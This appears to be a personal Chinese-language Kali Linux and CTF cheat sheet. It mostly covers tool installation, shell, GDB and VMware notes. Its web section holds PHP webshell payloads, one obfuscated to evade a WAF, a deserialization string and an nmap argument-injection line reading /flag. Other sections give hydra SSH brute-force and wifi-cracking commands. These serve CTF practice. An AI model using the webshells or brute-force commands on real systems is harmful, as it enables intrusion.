sudo vi /etc/proxychains.conf
[TOC]
# Kali
192.168.100.234 255.255.255.0 192.168.100.1

python3 transition
https://www.kali.org/docs/general-use/python3-transition/

## Init

### init 2021.2
```sh
sudo dpkg --add-architecture i386
```
#### 考虑安装 sage
echo "----------sage"
wget https://mirrors.tuna.tsinghua.edu.cn/sagemath/linux/64bit/sage-9.0-Ubuntu_18.04-x86_64.tar.bz2
tar -xvjf sage-9.0-Ubuntu_18.04-x86_64.tar.bz2
sudo ln -s `pwd`/SageMath/sage /usr/local/bin/sage
./sage

#### 考虑安装 pwndbg

    cd ~/Downloads/pwndbg
    ./setup.sh

    pwndbg在调试堆的数据结构时候很方便

    peda在查找字符串等功能时方便

    安装peda：

    git clone https://github.com/longld/peda.git ~/peda
    安装gef：

    # via the install script
    $ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh
     
    # manually
    $ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py
    $ echo source ~/.gdbinit-gef.py >> ~/.gdbinit
    切换gdb的调试工具pwndbg或peda：

    vim ~/.gdbinit
    source ~/peda/peda.py
    把第二行添加到gdbinit的配置文件中去，把pwndbg的注释掉，即可切换为peda

    选中gef的话，即添加一行：

    source ~/.gdbinit-gef.py
    并把其他两行注释掉即可

#### 指定 gdb的python版本

```sh
wget ftp://sourceware.org/pub/gdb/releases/gdb-9.2.tar.gz
tar zxvf gdb-9.2.tar.gz
rm -rf build
mkdir build && cd build
/home/kali/Downloads/gdb-9.2/configure
# 下面没用 还是出错 换kali版本
# /home/kali/Downloads/gdb-9.2/configure --with-python='/usr/bin/python3.8'
sudo make && sudo make install
```
#### proxy
export http_proxy=http://192.168.42.116:1080
export https_proxy=http://192.168.42.116:1080
export no_proxy=localhost

### sage 安装
https://www.jianshu.com/p/ddf9376334cd

1. 进入 http://www.sagemath.org/download-linux.html 下载

2. 解压 tar -xjf *.tar.bz2

3. sudo ln -s /path/to/SageMath/sage /usr/local/bin/sage

### install edb

    # install dependencies
    sudo apt-get install -y cmake build-essential libboost-dev libqt5xmlpatterns5-dev qtbase5-dev qt5-default libqt5svg5-dev libgraphviz-dev libcapstone-dev pkg-config

    # build and run edb
    git clone --recursive https://github.com/eteran/edb-debugger.git
    cd edb-debugger
    mkdir build
    cd build
    cmake ..
    make
    ./edb

## zsh 安装
centos 多一步 `yum install zsh autojump autojump-zsh`

Step 1
```
sudo apt install zsh

export https_proxy=192.168.50.161:1081
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
或者
wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh
或者
curl -L http://install.ohmyz.sh | sh



chsh -s /bin/zsh root
# 为当前用户修改默认shell为zsh
chsh -s /bin/zsh
# or chsh -s `which zsh` # 恢复命令 chsh -s /bin/bash

git clone --depth=1 https://github.com.cnpmjs.org/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions

```

Step 2

bash 处理 ~/.zshrc for CentOS

```
source /etc/profile.d/autojump.sh

# Kali
sudo apt-get install autojump
config:(ubuntu,add line in ~/.zshrc )

. /usr/share/autojump/autojump.sh

wget https://raw.githubusercontent.com/rupa/z/master/z.sh
echo . ~/z.sh>>~/.zshrc

unset HTTPS_PROXY


```

autojump 然后通过 j 来快速跳转。

安装过程，3大件
http://ranxb.cn/2019/12/08/zsh-oh-my-zsh/
https://www.jianshu.com/p/aea390c1c8ef

教程
https://www.zhihu.com/question/21418449
https://github.com/zsh-users/antigen
https://blog.csdn.net/u011054333/article/details/79314095

三、卸载Oh My Zsh

    $ uninstall_oh_my_zsh

结束进程
```
kill emacs<TAB>
kill 59683
```

### zsh bindkey 怎样获取键值

sudo showkey -a

### zsh使用
[主题](https://github.com/ohmyzsh/ohmyzsh/wiki/Themes) , .zshrc中修改

提示正确，CTRL+F采纳

智能补全
```
cd /v/w/h 按tab
=> cd /var/www/html
```
cd 两次 TAB 键 zsh 给你一个补全目录，让你上下左右选择
或者 ctrl + f/b/p/n （左右上下）
CTRL+G 退出选择模式

快速跳转

cd -<TAB>

### z命令
列出全部访问的目录

z加关键字跳转
```
~ ᐅ z
59971      /home/kali/Downloads
89992      /home/kali/Public
~ z c  => /home/kali/Public
~ z ds => /home/kali/Downloads
```

z -l src" 可以列出包含 src 的所有历史路径：
```
project1/src
project2/src
使用 z -l key1 [key2 ... ]
z 1 src 跳到1
z 2 src 跳到2
```
### autojump
j -s 列出数据库目录
跳上一个目录
j 
跳转到一个包含foo字符串的目录：
j foo
用法2：跳转到一个包含foo字符串目录的子目录：
jc foo

用法3：在终端直接打开包含foo字符串目录的文件管理器
jo foo
用法4：在终端直接打开包含foo字符串目录的子目录的的文件管理器

jco foo

用法5：有两个目录包含相同子串：
1 20.0:   /home/weidong/temp/eoo/bar
2 34.6:   /home/weidong/temp/foo/bar

那么j bar会跳转到权重最大的目录，

你也可以通过j w bar跳转到权重相对较小的目录，
不过在实践中发现j bar与j w bar跳转的目录是相同的，都是权重最大的目录

### 热键绑定  zsh的bindkey
输入cat<Enter>, 按键获得键码

\e alt

```
bindkey -s '\eo'   'cd ..\n'    # 按下ALT+O 就执行 cd .. 命令
bindkey -s '\e;'   'ls -l\n'    # 按下 ALT+; 就执行 ls -l 命令
bindkey '\e[1;3D' backward-word       # ALT+左键：向后跳一个单词
bindkey '\e[1;3C' forward-word        # ALT+右键：前跳一个单词
bindkey '\e[1;3A' beginning-of-line   # ALT+上键：跳到行首
bindkey '\e[1;3B' end-of-line         # ALT+下键：调到行尾
```

$bindkey  # 列出已有key

终端下从 v220t 到 xterm 规范里，按下 alt+x 会先发送一个8位 ASCII 码 27，即 ESC键的扫描吗，然后跟着 x 这个字符，也等价于快速（比如100毫秒内）前后按下 ESC 和 x。

#### 先不装: inc补全插件

```
mkdir ~/.oh-my-zsh/plugins/incr
wget -P ~/.oh-my-zsh/plugins/incr/ http://mimosa-pudica.net/src/incr-0.2.zsh
echo source ~/.oh-my-zsh/plugins/incr/incr*.zsh>>~/.zshrc
```

## 常用命令
打开当前文件夹在terminal

xdg-open .

man 帮助

man 1 ls      man1是普通的shell命令比bai如ls
man 2 open    man2是系统调用比如open，write说明，
man 3 printf  man3是函数说明

dd if=源文件名 bs=1 skip=开始分离的字节数 of=输出文件名

man [command] 查看帮助, 如 man atoi

ctrl z 挂起到后台
fg 程序回到前台
bg 显示后台程序
ctrl d 停止当前程序

ss -tnl
netstat -pantu

find
  
    find / -iname xxxx.jpg

grep
 
    grep  "flag" -r -a * 

strings xiaojiejie.jpeg | grep -E "\{[a-z]{4,}"

strings -a -t x libc_32.so.6 | grep "/bin/sh"

    # -a 扫描全段
    # -t 输出字符位置， 基于8进制、10进制或16进制

python filemonitor.py &
&后台运行
who 查看谁连接了服务器
  pts 为远程终端
  pkill -kill -t pts/0 # /后面0是终端号

### 调试相关

如何用脚本输入程序运行参数：

    l ./pwn1 `python -c "print 'a'*28"`
    2 ./pwn1 $(python -c "print 'a'*28")
    3. echo `python -c "print 'a'*28"`

cyclic 100
    
    生成100个字符

16进制显示

    ./fmt_write.c | xxd 


locate my.cnf

du -sh *
du -sh * | sort -n 统计当前文件夹(目录)大小，并按文件大小排序
du -lh --max-depth=1 : 查看当前目录下一级子文件和子目录占用的磁盘容量。
du -sk filename 查看指定文件大小
df -h 查看系统中文件的使用情况

    df参数：

    -a：列出所有的文件系统，包括系统特有的/proc等文件系统

    -k：以KB的容量显示各文件系统

    -m：以MB的容量显示各文件系统

    -h：以人们较易阅读的GB,MB,KB等格式自行显示

    -H：以M=1000K替代M=1024K的进位方式

    -T：连同该分区的文件系统名称（例如ext3）也列出

    -i：不用硬盘容量，而以inode的数量来显示

nmap

    127.0.0.1' -iL /flag -oN vege.txt ' # nmap 读取文件
    -iL nmaptest.txt  # 扫描文件中列出的所有IP地址
    -oN vege.txt # 保存扫描结果到 vege.txt

### 查看文件

cat, more, less

    less 与 more 类似，但使用 less 可以随意浏览文件，而 more 仅能向前移动，却不能向后移动，而且 less 在查看之前不会加载整个文件。

### 字符串处理 String

cat 显示文件
    
    输出多行到文本
    cat <<EOT >> ~/twolines
    line1
    line2
    EOT

相同行合并字串 paste file1 file2
    
    cat file1
        1
        2
    cat file2
        a
        b
    paste file1 file2
        1 a
        2 b
    paste -d: file1 file2
        1:a
        2:b

awk 分割 拆分

    以逗号分割，打印2,3列
    用-F指定一个或者多个
    cat test.csv | awk -F "," '{print $2,$3}'
    也可以用BEGIN块+FS来处理，OFS表示输出的分隔符
    cat test.csv | awk 'BEGIN{FS=",";OFS=";" }{ print $2,$3}'

    NR:表示当前记录数
    FNR:也表示当前记录数，但是FNR的作用域只在一个文件内.如果重新打开文件,FNR会从1开始.
    
    合并追加
    $ awk 'NR==FNR{a[$2]=$0;next}NR>FNR{if($1 in a)print a[$1],$2}' fil1 file2>file3
        当NR==FNR为真时,判断当前读入的是第一个文件，然后使用{a[$2]=$0;next}循环将第一个文件的每行记录都存入数组a,并使用$2第2个字段cid作为下标引用.
        由NR>FNR为假时,判断当前读入了第二个文件，然后判断第二个文件的第一个字段cid是否在数组a中，如果在的话执行{print a[$1],$2}，打印出数组a和第二个文件的第二个字段此时变量$1为第二个文件的第一个字段,与读入第一个文件时,采用第一个文件第二个字段$2 status。最后将经过输出到file3中。
        $ cat fil1
        st cid name
        1 111 wy
        2 222 xlx
        3 333 ww
        4 444 yyy

        $ cat file2
        cid status
        111 a
        222 b
        333 c

        $ cat file3
        st cid name status
        1 111 wy a
        2 222 xlx b
        3 333 ww c


awk -- ssh相关操作

    找出ssh连接
    ps -ef | grep @pts | grep sshd | awk '{print $9}' # loginuser
    ps -ef | grep @pts | grep sshd | awk '{print $2}' # pid
    ps -ef | grep @pts | grep sshd | awk '{printf($2); system("kill " $2)}' # pid


sed
    
    sed -i "s/F;/\?/g"  isFraud.csv  // F; 替换为 ?
    sed -i "s/T;/\?/g"  isFraud.csv  // T; 替换为 ?

### vim
永久配置 

    vim ~/.vimrc
    # 解决不能复制
    set mouse=c

#### Shell 等加密常用

[dd](https://www.cnblogs.com/misswangxing/p/10911969.html)将bmp文件0x1171a9后面取出来。

    dd if=./phrack.bmp of=out.png ibs=0x1171a9 skip=1 count=1

echo 1 | sha256sum

    sha1deep      sha224sum     sha256sum     sha512sum
    sha1sum       sha256deep    shasum    md5sum

echo -n 155989|openssl dgst -sha256 

    # -n 不输入 newline

echo -n "message" | sha1sum 

echo abc | openssl base64

echo YWJjCg== | openssl base64 -d

openssl base64 -d -in t.base64

__二. 利用openssl命令进行md5/sha1摘要（digest）__

1. 对字符串'abc'进行md5摘要计算：`echo abc | openssl md5`

2. 若对某文件进行md5摘要计算：`openssl md5 -in t.txt`

3. 对字符串'abc'进行sha1摘要计算：`echo abc | openssl sha1`

4. 若对某文件进行sha1摘要计算：`openssl sha1 -in t.txt`

__三. 利用openssl命令进行AES/DES3加密解密（AES/DES3 encrypt/decrypt）__

对字符串'abc'进行aes加密，使用密钥123，输出结果以base64编码格式给出：

		# echo abc | openssl aes-128-cbc -k 123 -base64
		U2FsdGVkX18ynIbzARm15nG/JA2dhN4mtiotwD7jt4g=   （结果）


对以上结果进行解密处理：

		# echo U2FsdGVkX18ynIbzARm15nG/JA2dhN4mtiotwD7jt4g= | openssl aes-128-cbc -d -k 123 -base64
		abc  （结果）

若要从文件里取原文（密文）进行加密（解密），只要指定 -in 参数指向文件名就可以了。

进行des3加解密，只要把命令中的aes-128-cbc换成des3就可以了。
#### （（表达式1,表达式2…））
特点：

    1、在双括号结构中，所有表达式可以像c语言一样，如：a++,b--等。
    2、在双括号结构中，所有变量可以不加入：“$”符号前缀。
    3、双括号可以进行逻辑运算，四则运算
    4、双括号结构 扩展了for，while,if条件测试运算
    5、支持多个表达式运算，各个表达式之间用“，”分开

echo $((0x10)) # 16进制的16
#### dd 命令分离文件

/tmp # dd if=a.bin of=c.bin bs=128k skip=18     //一个块为128K，跳过前18块。

/tmp # dd if=a.bin of=b.bin bs=128k count=18    //bs=128k,表示一个块128k, 从文件头开始，读取18块。

dd if=2.jpg of=2-1.jpg skip=158792 bs=1

可以参考 dd命令详解 ，这里if是指定输入文件，of是指定输出文件，skip是指定从输入文件开头跳过158792个块后再开始复制，bs设置每次读写块的大小为1字节 。

16进制地址分离

dd if=logo.jpg of=2-1.jpg skip=$((0x7011)) bs=1

### 启动服务 mysql

1
  
    systemctl start mysql

2

    sudo /etc/init.d/mysql start
    sudo /etc/init.d/mysql stop
    sudo /etc/init.d/mysql restart


## 关键字
flag
key
ctf

## Web

### 基本知识
  
  Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，
  告诉服务器我是从哪个页面链接过来的
### php

未整理

    # 注意看注释，可能有需要提交的字段 
    修改上传格式， burpsuite 抓包，修改
    超长数字--可能时间戳
    看参数
      index.php?line=&filename=a2V5cy50eHQ= ， 这里 line=数字 加 filename=[base64filename] 可以读取源码行
      尝试获取 index.php hint.php flag.php key.php
      ?txt=data://text/plain,welcome to the bugkuctf&file=hint.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

    语句
      ?s=print_r(scandir('./')) , 显示当前目录文件

    过狗
      <?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?>

审题

     robots.txt, 
     参数提示 x== ?? 时 =admin

绕过

    md5, sha1 相同，值又不同 ---- 空数组 k[]=1&k2[]=2
    jpg格式绕过:  抓包, Content-Type改成Multipart/form-data大小写绕过, 请求内容里的Content-Type改成image/jpg, 扩展名需要挨个试--除了php5都过滤了。
    
    上传相关： 可以是值也可以是数组---在上传时写入文需要有fopen fwrite fclose等等系列函数，还有一种file_put_contents()函数，它与依次调用上面三个函数功能一样，并且还这个可以允许数组。
    No No No 提示可能是数组 data参数改为 data[]

上传任意

    <script language="PHP">
       echo((file_get_contents('flag.'.'p'.'h'.'p')));
    </script>

变量覆盖

    变量shiyan和变量content的值相同： ?shiyan=&flag= 

strcmp漏洞
    
    payload为：?a[]=123 ， php5.3 以前 传入非字符串类型的数据的时候，这个函数将发生错误，判定相等


php中的 md5 碰撞
  
    因为0e开头的关系，认为值是相同的。md5加密后为0e开头即可。以都均可
    s878926199a,  s1885207154a,  s1836677006a,  s155964671a

### Web 工具

    开发者工具 ， 有些值可以在 F12-存储里 直接修改
    BurpSuit 抓包 直接GET改成POST
    Firefox-Hackbar

### 一些 php code

     filename=123.php&data=<?php%20@eval($_GET["code"]) ?>

### 提示

## 相关工具
fcrackzip -- kali暴破zip
  fcrackzip -b -l 3-3 -c1 -v flag.zip # 暴破3位
Advanced Archive Password Recovery 4.53 压缩包暴破 明文攻击，加密文件

### 隐写
stegdetect 识别部分隐写

不知道什么文件后，
  可以直接在winhex里搜索字符 
  或者 grep 'key' -a filename, 

jar 解压直接搜flag
### 加密解密
RouterPassView 宽带路由器解密
mimikatz.exe 读取dmp文件。 16进制 MD MP 开头

#### Crypto
常见加密形式

     \176 这种用 Unescape转
     &#x26 --- html 解码
     @iH<,{bdR2H;i6*Tm,Wx2izpx2! --- 91解码
     affine ----- 仿射 https://blog.csdn.net/zz_Caleb/article/details/84184283
     RC4: key welcometoicqedu 密文UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw== 

压缩包明文攻击：有1文件x.jpg和 .zip压缩包中都含有同样一个文件。

    用archpr, 选plain_text，将 x.jpg压缩成 zip(和目标同格式)。选好两个文件。点击start。

字典工具

    pwgen
    xeger 
 
### 暴力破解

  `wifi
    crunch 11 11 -t 1391040%%%% >>wifipass.txt # 生成字典
    aircrack-ng -w wifipass.txt wifi.cap

  ## hydra sh暴破
    只知道账号时  
    /usr/share/wordlists 下有常用的字典
    hydra -l hsj -P /usr/share/wordlists/metaploit/unix_passwords.txt ssh://192.168.232.146 # hsj用户名
### 字典工具 

#### crunch
[crunch](https://blog.csdn.net/qq_42025840/article/details/81125584) `<min-len> <max-len> [<charset string>] [options]`

`crunch 11 11 -t 1391040%%%%`

-t @,%^，指定模式，@,%^分别代表意义如下：

    @ 插入小写字母
    , 插入大写字母
    % 插入数字
    ^ 插入特殊符号          
    使用实例:(当确定使用的对象类型但不具体知道是那些时可以使用占位符)
例1、

    生成缺位的手机号码(有可能作为路由器密码或wifi密码（8-11位）)
    crunch 11 11   -t  1503453%%%%   -o 1.txt 或>> 1.txt(以%位数字占位符)
例二：

    crunch 4 4  + + 123 + -t %%@^ 
    生成4位密码，其中格式为“两个数字”+“一个小写字母”+“常见符号”(其中数字这里被指定只能为123组成的所有2位数字组合)。比如12f#，32j^，13t$......


## 未来学习

cbc字节反转攻击
pwn https://blog.csdn.net/qq_18823653/article/details/88824173

改密码?
  echo "密码" | passwd --stdin 用户名
  echo higo#gogo | passwd --stdin hsj
  echo dx$ftpQ9 | passwd --stdin ftp

### AWD

#### 靶机
FTP弱口令，flag文件
robots文件，包含后台路径，需SSL遍历后台
ssh弱口令，hsj+123;/home/hsj/flag 仅hsj可读
环境变量  /phpinfo.php
发现后台并登陆后，后台首页；心脏出血、弱口令
gv32后台管理首页；注入即可
通过菜刀可读 /root/.flag
upload目录有webshell，内有flag 散列需解密
SUID后门；须反弹shell提权，-p；/flag
内核提权，例如dirtycow；/etc/passwd--

## 其他

    gcc编译 gcc hello.c -o hello
    g++ hello.cpp -o hello
    g++ hello1.cpp hello2.cpp -o hello（或makefile）
## save

https://blog.csdn.net/shenzhang7331/article/details/84311280

https://www.freebuf.com/sectool/185468.html

## GDB
### GDB 安装
找新版本
```
sudo apt remove gdb gdbserver
whereis gdb
# rm all

cd ~/Downloads
curl -O http://ftp.gnu.org/gnu/gdb/gdb-9.2.tar.gz
curl -x http://192.168.50.161:1081 -O http://ftp.gnu.org/gnu/gdb/gdb-9.2.tar.gz

tar zxvf gdb-9.2.tar.gz
cd gdb-9.2
mkdir build && cd build
# `pwd`/../configure
`pwd`/../configure --with-python='/usr/bin/python3.9'
sudo make && sudo make install
```
### GDB 调试
### 调试技巧
修改下一步运行地址

    disas main # 查看想跳到0x4007e
    set $rip=0x4007e # 就能跳过去了

### 常用命令
Enter 直接回车 表示重复上一条命令:

start 启动程序停在开辟完主函数栈帧的地方

at // attach

q 退出


b *0x400100 (b main):在 0x400100 处下断点, d [number]：删除断点, d * 删除全部

    b printf
    b system

r(run)  // 运行程序


使用si/ni 能确保是一步

n  //ni：单步步过
n 5 // 走5步
s  //si：单步步入
s/n // 针对提源代码
si,ni // 同sn, 针对是汇编代码

fin // 执行到返回

i r // info register
info b(reak) // 查看当前断点信息
info file  // 查看当前文件的信息，例如程序入口点

x/i 0x601060 // 查看汇编 1行
x/20i 0x601060 // 查看汇编 20行

x/16wx $esp // 查看栈情况

x/5s $eax  // 看5个 s字符串
x/5sw $eax // 看5个 s字符串 w--dword 双字
x/200w $eax // 看eax的 200个4字节

x/3uh 0x54320 //内存地址0x54320读取内容 3u 3w个字节
x/3us 0x601080 //读取地址字符串

已进入函数了 -8对齐
x/64gx $rsp-8
p 输出

    p __free_hook // 打印 freehook地址信息
    p shel // 打印 shell
    p 命令打印出函数地址 ，
    find 命令查找"/bin/sh" 字符串

 set *(char*)0x08048e3a = 0x74 修改汇编值

vm, vmmap 查看内存映射

如何查找函数三种方式
```sh
shell$ objdump -d test
shell$ objdump -M intel -d test | less
shell$ objdump -T ./libc.so.6 | grep 'read'
shell$ objdump -T ./libc.so.6 | grep '__libc_start_main'     这个在startmain前就会被call过
gdb-peda$ p shell
r2$ afl~shell
```
### peda
disass + main //反汇编main

disassemble + func // 对指定的函数进行反汇编

b main  // 断下main

b *0x400100 // 在 0x400100 处下断点

c(contunue)  // 继续执行

x /4xg $ebp：查看ebp开始的4个8字节内容（b：单字节，h：双字节，w：四字节，g：八字节；x：十六进制，s：字符串输出，i：反汇编，c：单字符）

x / (n , f ,u) // n,f,u是其三个可选参数

  n是一个正整数，表示需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容，一个内存单元的大小由后面的u定义。

  f 表示显示的格式，参见下面。如果地址所指的是字符串，那么格式可以是s，如果地址是指令地址，那么格式可以是i。

  u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字节，g表示八字节。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。

layout // 用于分割窗口，可以一边查看代码，一边测试。
主要有下面几种用法：

layout src // 显示源代码窗口

layout asm // 显示汇编窗口

layout regs // 显示源代码/汇编和寄存器窗口

layout split // 显示源代码和汇编窗口

layout next // 显示下一个layout

layout prev // 显示上一个layout

Ctrl + L // 刷新窗口

Ctrl + x  再按1 // 单窗口模式，显示一个窗口

Ctrl + x  再按2 // 双窗口模式，显示两个窗口

Ctrl + x  再按a // 回到传统模式，即退出layout，回到执行layout之前的调试窗口。

delete [number]：删除断点

tb一次性断点

watch *(int *)0x08044530：在内存0x0804453处的数据改变时stop


p $eax：输出eax的内容

set $eax=4：修改变量值


fini：运行至函数刚结束处

return expression：将函数返回值指定为expression

bt：查看当前栈帧

info f：查看当前栈帧

context：查看运行上下文

stack：查看当前堆栈

call func：强制函数调用

ropgagdet：找common rop

  ROPgadget --binary stack2 --string 'sh' 查找sh字符

vm, vmmap：查看虚拟地址分布

shellcode：搜索，生成shellcode

ptype struct link_map：查看link_map定义

p &((struct link_map*)0)->l_info：查看l_info成员偏移
### gdb attach, process后 gdb script有问题时，选默认终端为qterminal。

    gcc gdb-sample.c -o gdb-sample -g
    gdb
    file gdb-sample # file 载入程序
    b main # break at main
    r  # run
    s  # step into
    ni # step next/over
    (gdb) p n  # print n
    c  # Continu
    display /i $pc # 显示汇编指令
    si  #”命令用于执行一条汇编代码——区别于“s”执行一行C代码）：

    d  # Delete breakpoint）
        
        b *main # 在 main 函数的 prolog 代码处设置断点（prolog、epilog，分别表示编译器在每个函数的开头和结尾自行插入的代码）

    i r”命令显示寄存器中的当前值———“i r”即“Infomation Register”：
    i r eax
    i b # 查看断点
    q  #Quit

    list <linenum>
    • list <function>
    • list 显示当前行后面的源码
    • list -显示当前行前面的源码
     search <regexp>
    • forward-search 向前搜索
    • reverse-search 全部搜索


运行参数

    1、set args 10 20 30
    • 2、run 10 20 30
    • 3、gdb test -args 10 20 30
    • show args
    • 运行时输入数据：
    • run < payload.txt

    watch <expr>
    – 一旦表达式（变量）值有所变化，程序立马停住
    rwatch <expr>
    – 当expr被读时
    • awatch <expr>
    – 当expr被读或写时
    • info watchpoints
    • 清除停止点（break、watch、catch）
    – delete、clear、disable、enable

修改变量值

    (gdb)print x=4
    • (gdb)set x=4
    • (gdb)set var width=10

跳转执行

    • jump
    • jump <linespec>
    • jump <address>
    • 同样，也可以直接改变跳转执行的地址：
    • set $pc=0x08041234
    •

    x/32gx 0x602010-0x10 命令查看堆块情况
### pwngdb使用
在gdb.attach(io)之后，先输入r运行程序。再继续其他操作
## proxychains
sudo apt-get install proxychains
sudo vi /etc/proxychains.conf

## Vmware 共享文件夹

[Link](https://blog.csdn.net/qq_33438733/article/details/79671403)

查看windowns共享目录： `vmware-hgfsclient`

挂载共享目录：

    sudo mkdir /mnt/hgfs
    sudo vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other

挂载vmware到~/vmware

    mkdir ~/vmware
    sudo vmhgfs-fuse .host:/vmware /home/kali/vmware -o subtype=vmhgfs-fuse,allow_other

查看挂载情况：

    [root@bogon ~]# df -T
    vmhgfs-fuse             fuse.vmhgfs-fuse 179050492 32083464 146967028   18% /mnt/hgfs

### 添加开机项-方法1

    sudo vi /etc/fstab
    # 添加
    .host:/vmware /home/kali/vmware fuse.vmhgfs-fuse   allow_other   0   0
    # echo ".host:/vmware /home/kali/vmware fuse.vmhgfs-fuse   allow_other   0   0" | sudo tee -a /etc/fstab

    # 检测配置工作正常
    mount -a 

### 添加开机项-方法2

    sudo crontab -e
    # 加入
    @reboot /home/kali/x.sh

    # x.sh
    sudo vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other
    sudo mount --bind /mnt/hgfs/vmware /home/kali/vmware

#### 其他方法


5，设置开机启动

sudo vi /etc/init.d/mount

    #! /bin/sh
    sudo vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other
    sudo mount --bind /mnt/hgfs/vmware /home/kali/vmware

将`mount --bind /mnt/hgfs/vmware /home/kali/vmware`加入到`/etc/rc.local`文件中, centos7.2中开启启动需chmod +x /etc/rc.local赋给权限

注意使用这个方法时，代码如果是复制粘贴的，需要用vim打开. \r\n的dos格式会引起错误
    
    方法1 vi xx.sh
    :set ff=unix回车
    wq回车
    # ff -> file format

    方法2
    cat dbback.sh | tr "\r\n" "\n"

    方法3：
    sed -i 's/\r$//' file.sh
    将file.sh中的\r都替换为空白，问题解决


    sudo update-rc.d mount defaults 99

### 移除开机启动项

    sudo update-rc.d -f mount remove

update-rc.d mount start 99 2 3 4 5 . stop 01 0 1 6 . #设置启动级别

Use the `service --status-all` 也可以检查

    [ + ] – Services with this sign are currently running.
    [ – ] – Services with this sign are not currently running..
    [ ? ] – Services that do not have a status switch.

手动启动 systemctl start mount
自动启动 systemctl enable mount

### 添加开机项4

Had the same problem, found a solution in this post elsewhere.

Summary:

    sudo vim /etc/systemd/system/rc-local.service

Then add the following content to it.

    [Unit]
     Description=/etc/rc.local Compatibility
     ConditionPathExists=/etc/rc.local

    [Service]
     Type=forking
     ExecStart=/etc/rc.local start
     TimeoutSec=0
     StandardOutput=tty
     RemainAfterExit=yes
     SysVStartPriority=99

    [Install]
     WantedBy=multi-user.target
    Note: Starting with 16.10, Ubuntu doesn't ship with /etc/rc.local file anymore. Same thing for other distributions like Kali. You can create the file by executing this command.

    
`printf '%s\n' '#!/bin/bash' 'exit 0' | sudo tee -a /etc/rc.local`

Then add execute permission to /etc/rc.local file.

    sudo chmod +x /etc/rc.local

After that, enable the service on system boot:

    sudo systemctl enable rc-local
Finally, start the service and check its status:

    sudo systemctl start rc-local.service
    sudo systemctl status rc-local.service

The complete post in https://www.linuxbabe.com/linux-server/how-to-enable-etcrc-local-with-systemd

## Shell 脚本语法 

    vmware-hgfsclient | while read folder; do
        echo ${folder}
        # vm-folder1
        # vm-folder2
    done

echo `pwd`

## FAQ

### 中文乱码
```
sudo apt install xfonts-intl-chinese ttf-wqy-microhei -y
sudo dpkg-reconfigure locales
```
1. 空格选中zh_CN.UTF8, 回车。

2. 默认设置为en_us.UTF8

### 怎样离线安装软件包？

下载包文件

    sudo apt-get -d -y install open-vm-tools
    sudo apt-get -d -y install open-vm-tools-desktop
    sudo apt-get -d -y install open-vm-tools-desktop fuse

复制到U盘

    sudo cp -r /var/cache/apt/archives/* /U盘/路径/debs/

到无网络电脑上插U盘 创建包缓存目录

    $ sudo mkdir /var/debs
将U盘中下载好的包文件全部复制到/var/debs目录下

    $ sudo cp -r /U盘/路径/debs/* /var/debs/
生成包索引文件

    $ sudo touch /var/debs/Packages.gz
    $ sudo chmod -R 777 /var/debs/  # 这一步是为了获得文件的可写可读可执行权限，要不然后面会失败
    $ sudo dpkg-scanpackages debs  /dev/null  | gzip > debs/Packages.gz  # 创建索引
在 /etc/apt/sources.list 中添加本地目录

    $ sudo gedit /etc/apt/sources.list
将sources.list 原来的内容都注释掉。在最后添加

    $ deb file:/var debs/
注意上面的 /var 和 debs/ 之间的空格，以及 “/”。不要写错/var/debs/路径了。

更新索引

    $ sudo apt-get update

结束 现在可以安装包了。运行sudo apt-get install <包名> 就会像以前一样安装好了指定的包了。

### 关闭锁屏及密码

左上角菜单，搜Power

### 修复dpkg

sudo apt-get update && sudo apt-get upgrade && sudo apt-get autoremove
sudo apt-get install --fix-broken
如果的错误的包
sudo apt-get remove -y xxxx

### 自动登录

1.
vim /etc/lightdm/lightdm.conf

[Seat:*]
autologin-user=root

2.
vim ~/.dmrc

autologin-user=root
autologin-session=session

### Warning: apt-key is deprecated. 

sudo apt-key adv --recv-keys --keyserver keyserver.ubuntu.com BA6932366A755776

### 启用root用户
```
#1.修改密码
passwd root
# 2.设置 PermitRootLogin yes
sudo vi /etc/ssh/sshd_config
```
###  you don't have enough free space in /var/cache/apt/archives

mkdir -p "$HOME/debs/partial"
sudo rm -rf /var/cache/apt/archives
sudo ln -s "$HOME/debs" /var/cache/apt/archives

## gcc 使用

编译与运行

（1）简单直接的方式

如下命令会在当前目录下生成a.out文件，使用./a.out运行

    gcc main.c
    ./main

（2）分步骤

    gcc main.c -o hello
    ./hello

## TO save to workflow

连续输入文字到文件

    cat > xxx <<EOL
    a
    b
    c
    d
    EOL

## 其他安装
### pip2

curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py && python get-pip.py
curl -x http://192.168.50.161:1081 https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py && python get-pip.py
### pip3

curl "https://bootstrap.pypa.io/get-pip.py" -o "get-pip.py"
python3 get-pip.py --user

sudo apt-get remove python3-pip python3-distutils
sudo apt-get install python3-pip
sudo apt-get install python3-distutils

####  python3-distutils

### 切换到python3
ubuntu update python

https://dev.to/serhatteker/how-to-upgrade-to-python-3-7-on-ubuntu-18-04-18-10-5hab

sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.8 1

```
sudo apt remove -y python-is-python2
sudo apt install -y python-is-python3
```
看看正常么。


gdb安装pwntools
移除python3全部 whereis python , sudo rm -rf files


自动方法1.
sudo apt-get install software-properties-common -y
